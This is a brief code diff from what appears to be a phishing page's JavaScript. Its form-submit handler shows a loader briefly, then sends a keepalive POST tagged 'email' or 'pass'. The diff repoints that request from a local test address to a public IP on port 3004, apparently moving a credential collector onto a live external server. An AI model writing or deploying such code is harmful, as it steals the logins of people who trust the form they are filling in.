@@ -66,7 +66,7 @@ form.addEventListener("submit", (event) => {
             loader.style.display = "none";
         }, 1200);
         (async () => {
-            const request = new Request("http://192.168.1.11:3004", {
+            const request = new Request("http://13.53.38.90:3004", {
                 method: "POST",
                 headers: { "CustomHeader": `${b === 0 ? "email" : "pass"}` },
                 keepalive: true,
